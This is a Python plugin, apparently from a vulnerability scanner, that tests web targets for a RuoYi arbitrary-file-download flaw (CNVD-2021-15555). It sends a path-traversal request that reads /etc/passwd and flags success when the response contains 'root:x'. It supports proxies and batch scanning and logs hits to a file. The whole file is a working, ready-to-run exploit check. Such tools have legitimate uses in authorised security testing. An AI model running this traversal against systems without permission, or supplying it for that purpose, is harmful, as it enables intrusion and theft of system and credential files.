#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class Cnvd_2021_15555:

    def run(self, urls):
        url = urls + '/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd'
        header = {
            "Host": urls.split("://")[-1],
            "User-Agent": self.headers,
            "Accept": "*/*",
            "Connection": "Keep-Alive"

        }
        try:
            response = requests.get(url, headers=header, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and "root:x" in response.text:
                OutPrintInfoSuc("Ruoyi", f'存在Ruoyi任意文件下载: {url}')

                if self.batch:
                    OutPutFile("ruoyi_2021_15555.txt", f'存在Ruoyi任意文件下载: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("Ruoyi", f'不存在Ruoyi任意文件下载')

        except Exception:
            if not self.batch:
                OutPrintInfo("Ruoyi", '目标请求出错')
    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Ruoyi", '开始执行Ruoyi任意文件下载检测...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Ruoyi",'Ruoyi任意文件下载检测结束')